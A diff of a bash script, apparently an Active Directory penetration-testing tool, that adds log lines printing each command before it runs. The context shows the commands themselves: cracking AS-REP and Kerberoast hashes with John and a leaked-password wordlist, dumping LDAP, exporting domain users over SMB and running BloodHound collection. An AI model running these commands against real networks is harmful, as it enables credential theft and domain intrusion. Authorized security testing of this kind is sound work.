@@ -232,6 +232,7 @@ process_target_proto() {
                     echo -e "${RED}[!] ASREP hash found! Cracking with John...${NC}"
                     echo -e "${GRAY}[CMD] timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules \"$ASREP_HASH_FILE\"${NC}"
                     timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules "$ASREP_HASH_FILE" 
+                    echo -e "${GRAY}[CMD] john --show \"$ASREP_HASH_FILE\"${NC}"
                     ASREP_RESULT=$(john --show "$ASREP_HASH_FILE" | grep -v "password cracked" | grep ":")
                     if [[ -n "$ASREP_RESULT" ]]; then
                         echo -e "${GREEN}[+++] SUCCESS! Cracked ASREP Hash(es):\n${YELLOW}$ASREP_RESULT${NC}"
@@ -250,6 +251,7 @@ process_target_proto() {
                     echo -e "${RED}[!] Kerberoast hash found! Cracking with John...${NC}"
                     echo -e "${GRAY}[CMD] timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules \"$KERB_HASH_FILE\"${NC}"
                     timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules "$KERB_HASH_FILE" 
+                    echo -e "${GRAY}[CMD] john --show \"$KERB_HASH_FILE\"${NC}"
                     KERB_RESULT=$(john --show "$KERB_HASH_FILE" | grep -v "password cracked" | grep ":")
                     if [[ -n "$KERB_RESULT" ]]; then
                         echo -e "${GREEN}[+++] SUCCESS! Cracked Kerberoast Hash(es):\n${YELLOW}$KERB_RESULT${NC}"
@@ -272,7 +274,7 @@ process_target_proto() {
             echo "[DEBUG] RAW USER: $user"
             echo "[DEBUG] FINAL LDAP_USER: $LDAP_USER"
             echo -e "${YELLOW}[!] Executing ldapdomaindump...${NC}"
-            echo "[CMD] timeout 100s ldapdomaindump \"$ip\" -u \"$LDAP_USER\" -p \"$pass\" -o \"$DUMP_PATH\""
+            echo -e "${GRAY}[CMD] timeout 100s ldapdomaindump \"$ip\" -u \"$LDAP_USER\" -p \"$pass\" -o \"$DUMP_PATH\"${NC}"
             timeout 100s ldapdomaindump "$ip" -u "$LDAP_USER" -p "$pass" -o "$DUMP_PATH" 
 
             if [[ "$DOMAIN" != "." ]] && mkdir "$OUTDIR/lock_userexp_${DOMAIN}" 2>/dev/null; then
@@ -295,7 +297,7 @@ process_target_proto() {
             # --- USERS EXPORT (DOMAIN ONLY) ---
             if [[ "$DOMAIN" != "." ]] && mkdir "$OUTDIR/lock_userexp_${DOMAIN}" 2>/dev/null; then
                 echo -e "${YELLOW}[!] Exporting users via SMB for domain $DOMAIN...${NC}"
-
+                echo -e "${GRAY}[CMD] timeout 100s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG --users-export \"$USER_EXPORT_OUT.tmp\"${NC}"
                 timeout 100s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG --users-export "$USER_EXPORT_OUT.tmp" >/dev/null 2>&1
 
                 if [[ -s "$USER_EXPORT_OUT.tmp" ]]; then
@@ -360,7 +362,8 @@ process_target_proto() {
                     echo -e "${YELLOW}[*] Ingesting AD data via BloodHound...${NC}"
                     (
                         cd "$BH_DIR" || exit
-                        timeout 150s bloodhound-ce-python -d "$DOMAIN" -dc "${DC_FQDN_MAP[$DOMAIN]}" -u "$user" -p "$pass" -ns "$dc_ip" -c all --zip | tee bloodhound_run.log
+                        echo -e "${GRAY}[CMD] timeout 150s bloodhound-ce-python -d \"$DOMAIN\" -u \"$user\" -p \"$pass\" -ns \"$dc_ip\" -c all --zip${NC}"
+                        timeout 150s bloodhound-ce-python -d "$DOMAIN" -u "$user" -p "$pass" -ns "$dc_ip" -c all --zip | tee bloodhound_run.log
                     )
                 fi
             fi
